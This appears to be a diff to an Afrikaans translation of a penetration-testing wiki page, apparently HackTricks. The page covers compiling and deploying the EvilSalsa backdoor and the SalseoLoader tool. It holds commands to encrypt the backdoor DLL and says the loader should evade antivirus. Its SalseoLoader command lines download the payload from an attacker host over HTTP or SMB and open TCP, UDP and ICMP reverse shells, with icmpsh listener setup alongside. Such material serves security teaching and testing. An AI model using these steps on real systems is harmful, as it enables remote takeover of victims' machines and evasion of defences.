@@ -2,15 +2,15 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Samevoeg van die binêre
+## Compiling the binaries
 
-Laai die bronkode van die github af en saam te stel **EvilSalsa** en **SalseoLoader**. Jy sal **Visual Studio** geïnstalleer moet hê om die kode saam te stel.
+Laai die bronkode van die github af en kompileer **EvilSalsa** en **SalseoLoader**. Jy sal **Visual Studio** geïnstalleer moet hê om die kode te kompileer.
 
-Stel daardie projekte saam vir die argitektuur van die Windows-boks waar jy dit gaan gebruik (As die Windows x64 ondersteun, stel dit saam vir daardie argitektuur).
+Kompileer daardie projekte vir die argitektuur van die Windows-boks waar jy dit gaan gebruik (As die Windows x64 ondersteun, kompileer dit vir daardie argitektuur).
 
 Jy kan **die argitektuur kies** binne Visual Studio in die **linker "Build" Tab** in **"Platform Target".**
 
-(\*\*As jy nie hierdie opsies kan vind nie, druk op **"Project Tab"** en dan op **"\<Project Name> Properties"**)
+(**As jy nie hierdie opsies kan vind nie, druk op **"Project Tab"** en dan op **"\<Project Name> Properties"**)
 
 ![](<../images/image (132).png>)
 
@@ -18,9 +18,9 @@ Dan, bou albei projekte (Build -> Build Solution) (Binne die logs sal die pad va
 
 ![](<../images/image (1) (2) (1) (1) (1).png>)
 
-## Berei die Backdoor voor
+## Prepare the Backdoor
 
-Eerstens, jy sal die **EvilSalsa.dll.** moet kodeer. Om dit te doen, kan jy die python-skrip **encrypterassembly.py** gebruik of jy kan die projek **EncrypterAssembly** saamstel:
+Eerstens, jy sal die **EvilSalsa.dll.** moet kodeer. Om dit te doen, kan jy die python-skrip **encrypterassembly.py** gebruik of jy kan die projek **EncrypterAssembly** kompileer:
 
 ### **Python**
 ```
@@ -32,7 +32,7 @@ python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
 ```
-Ok, nou het jy alles wat jy nodig het om al die Salseo goed te voer: die **gecodeerde EvilDalsa.dll** en die **binarie van SalseoLoader.**
+Ok, nou het jy alles wat jy nodig het om al die Salseo goed te uitvoer: die **gecodeerde EvilDalsa.dll** en die **binarie van SalseoLoader.**
 
 **Laai die SalseoLoader.exe binarie op die masjien. Hulle behoort nie deur enige AV opgespoor te word nie...**
 
@@ -40,17 +40,17 @@ Ok, nou het jy alles wat jy nodig het om al die Salseo goed te voer: die **gecod
 
 ### **Kry 'n TCP reverse shell (aflaai van die gecodeerde dll deur HTTP)**
 
-Onthou om 'n nc te begin as die reverse shell luisteraar en 'n HTTP bediener om die gecodeerde evilsalsa te bedien.
+Onthou om 'n nc as die reverse shell luisteraar en 'n HTTP bediener te begin om die gecodeerde evilsalsa te bedien.
 ```
 SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
 ```
-### **Om 'n UDP omgekeerde skulp te kry (gedownloade kodering dll deur SMB)**
+### **Om 'n UDP omgekeerde skulp te kry (aflaai van kodering dll deur SMB)**
 
-Onthou om 'n nc as die omgekeerde skulp luisteraar te begin, en 'n SMB-bediener om die gekodeerde evilsalsa (impacket-smbserver) te bedien.
+Onthou om 'n nc as die omgekeerde skulp luisteraar te begin, en 'n SMB-bediener om die gekodeerde evilsalsa te bedien (impacket-smbserver).
 ```
 SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
 ```
-### **Kry 'n ICMP omgekeerde skulp (geënkodeerde dll reeds binne die slagoffer)**
+### **Kry 'n ICMP omgekeerde skulp (gecodeerde dll reeds binne die slagoffer)**
 
 **Hierdie keer het jy 'n spesiale hulpmiddel in die kliënt nodig om die omgekeerde skulp te ontvang. Laai af:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
 
@@ -65,13 +65,13 @@ sysctl -w net.ipv4.icmp_echo_ignore_all=0
 ```
 python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
 ```
-#### Binne die slagoffer, kom ons voer die salseo ding uit:
+#### Binne die slagoffer, laat ons die salseo ding uitvoer:
 ```
 SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 ```
-## Samevoeging van SalseoLoader as DLL wat hooffunksie uitvoer
+## Samevoeging van SalseoLoader as DLL wat die hooffunksie uitvoer
 
-Maak die SalseoLoader-projek oop met Visual Studio.
+Open die SalseoLoader-projek met Visual Studio.
 
 ### Voeg voor die hooffunksie by: \[DllExport]
 
@@ -83,7 +83,7 @@ Maak die SalseoLoader-projek oop met Visual Studio.
 
 ![](<../images/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-#### **Soek vir DllExport-pakket (met die Blader-oortjie), en druk Installeer (en aanvaar die pop-up)**
+#### **Soek vir DllExport-pakket (met die Blader-tab), en druk Installeer (en aanvaar die pop-up)**
 
 ![](<../images/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
@@ -97,7 +97,7 @@ Druk **Uninstall** (ja, dit is vreemd, maar glo my, dit is nodig)
 
 ### **Verlaat Visual Studio en voer DllExport_configure uit**
 
-Net **verlaat** Visual Studio
+Verlaat net **Visual Studio**
 
 Gaan dan na jou **SalseoLoader-gids** en **voer DllExport_Configure.bat** uit
 
@@ -105,7 +105,7 @@ Kies **x64** (as jy dit binne 'n x64-boks gaan gebruik, dit was my geval), kies 
 
 ![](<../images/image (7) (1) (1) (1) (1).png>)
 
-### **Maak die projek weer oop met Visual Studio**
+### **Open die projek weer met Visual Studio**
 
 **\[DllExport]** moet nie langer as 'n fout gemerk wees nie
 
@@ -113,7 +113,7 @@ Kies **x64** (as jy dit binne 'n x64-boks gaan gebruik, dit was my geval), kies 
 
 ### Bou die oplossing
 
-Kies **Uitsettipe = Klasbiblioteek** (Projek --> SalseoLoader Eienskappe --> Aansoek --> Uitsettipe = Klasbiblioteek)
+Kies **Uitsettipe = Klasbiblioteek** (Projek --> SalseoLoader Eienskappe --> Toepassing --> Uitsettipe = Klasbiblioteek)
 
 ![](<../images/image (10) (1).png>)
 
